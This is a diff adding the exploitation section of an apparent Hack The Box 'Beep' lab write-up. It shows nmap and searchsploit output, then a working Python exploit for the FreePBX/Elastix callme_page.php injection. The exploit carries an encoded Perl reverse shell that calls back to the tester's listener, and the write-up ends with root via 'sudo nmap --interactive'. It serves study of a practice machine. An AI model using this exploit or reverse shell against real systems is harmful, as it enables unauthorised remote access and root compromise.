@@ -8,7 +8,7 @@ So I tried -A which enables OS detection, version, detection, script scanning, a
 And I also added -v which increases verbosity. Essentially just gives more details.
 
 ```
-kali@kali:~$ sudo nmap -A -v 10.129.84.71
+kali@kali:~/htb/Beep$ sudo nmap -A -v 10.129.84.71
 ...
 ...
 ...
@@ -50,7 +50,7 @@ This also gives us a backend version. freepbx 2.8.1.4
 So lets throw both of these into searchsploit to see if we find something useful.
 
 ```
-kali@kali:~$ searchsploit Elastix
+kali@kali:~/htb/Beep$ searchsploit Elastix
 ------------------------------------------------------------- ---------------------------------
  Exploit Title                                               |  Path
 ------------------------------------------------------------- ---------------------------------
@@ -63,7 +63,7 @@ Elastix < 2.5 - PHP Code Injection                           | php/webapps/38091
 FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution       | php/webapps/18650.py
 ------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-kali@kali:~$ searchsploit freepbx 2.8.1.4 
+kali@kali:~/htb/Beep$ searchsploit freepbx 2.8.1.4 
 ------------------------------------------------------------- ---------------------------------
  Exploit Title                                               |  Path
 ------------------------------------------------------------- ---------------------------------
@@ -75,5 +75,73 @@ Shellcodes: No Results
 
 That FreePBX / Elastix RCE looks very likely. Although the FreePBX version is listed as 2.10.0, lets open it up and see what we can find.
 
+The version is specified as: `Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.`
+
+So our versions might match.
 
 
+```
+import urllib
+rhost="10.129.84.71" # Target address
+lhost="10.10.14.21"  # Our listening address
+lport=443
+extension="1000"
+
+# Reverse shell payload
+
+url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
+
+urllib.urlopen(url)
+```
+
+
+What is happening here?
+
+There is an unsanitized parameter in the recordings/misc/callme_page.php page. And this parameter ends up in the Asterisk Management Interface socket. The payload is eventually executed on the VOIP server.
+
+So I run the code:
+
+```
+IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)
+```
+
+Hmm. I did have to enable TLS 1.0 earlier, maybe I need to do some additional configuring in the connection.
+
+```
+import urllib.request
+import ssl
+
+rhost="10.129.84.71" # Target address
+lhost="10.10.14.21"  # Our listening address
+lport=443
+extension=233
+
+# Reverse shell payload
+
+url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
+
+urllib.request.urlopen(url, context=ssl.SSLContext(ssl.PROTOCOL_TLSv1))
+```
+
+This one did the trick. I made sure the connection used TLS 1.0. In addition I had to change the extension. It used to be 1000.
+
+
+```
+kali@kali:~$ sudo rlwrap nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.84.71 53861
+id
+uid=100(asterisk) gid=101(asterisk)
+```
+
+We set the listener, and we are in. Our user is asterisk. In the exploit page, it explicitly states that we can exploit an nmap vulnerability to gain root. So lets try that.
+
+```
+sudo nmap --interactive
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+```
